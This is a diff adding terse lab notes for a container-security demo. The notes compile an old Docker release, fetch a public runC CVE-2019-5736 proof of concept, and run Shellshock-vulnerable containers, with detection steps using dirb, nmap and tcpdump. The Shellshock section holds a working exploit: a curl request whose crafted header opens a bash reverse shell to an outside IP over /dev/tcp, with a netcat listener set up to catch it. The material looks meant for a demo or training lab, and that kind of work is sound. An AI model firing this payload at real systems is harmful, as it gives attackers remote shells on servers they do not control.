@@ -1,0 +1,43 @@
+1. compile docker
+https://ops.tips/blog/compiling-your-own-forked-docker-release/
+
+apt-get install -y build-essential
+apt-get install -y docker.io
+git clone https://github.com/docker/docker-ce.git
+git checkout v18.03.1-ce
+make static DOCKER_BUILD_PKGS=static-linux
+dpkg --purge docker.io
+
+cp components/packaging/static/build/linux/* /usr/local/bin
+
+2. set runC vuln
+https://github.com/Frichetten/CVE-2019-5736-PoC
+git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
+apt-get install -y goland-go
+sudo docker run -it -v $(pwd):/app ubuntu:18.04 /bin/bash
+
+
+
+3. set shellshock with apache running as root
+sudo docker network create --subnet=172.18.0.0/16 pocnet
+sudo docker login
+sudo docker run --network pocnet --ip 172.18.0.22 sandrolex2/poc
+sudo docker run --network pocnet --ip 172.18.0.23 -p 80:80 sandrolex2/rproxy
+sudo docker run --network pocnet --ip 172.18.0.40 sandrolex2/stub
+curl host/cgi-bin/index.bash
+
+nc -lnvp 8888
+curl 172.17.0.2/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/172.31.87.117/8888 0>&1 "
+id
+
+Detect cgi with dirb
+dirb http://bionic/app1/ /usr/share/dirb/wordlists/vulns/cgis.txt | grep 200
+
+4. detecting shellsock with nmap
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/index.bash 172.16.131.132
+
+5. capturing traffic of containers in host
+ls /sys/class/net
+-- get the veth interface name
+sudo tcpdump -i vethc810c2a -w a.pcap
+
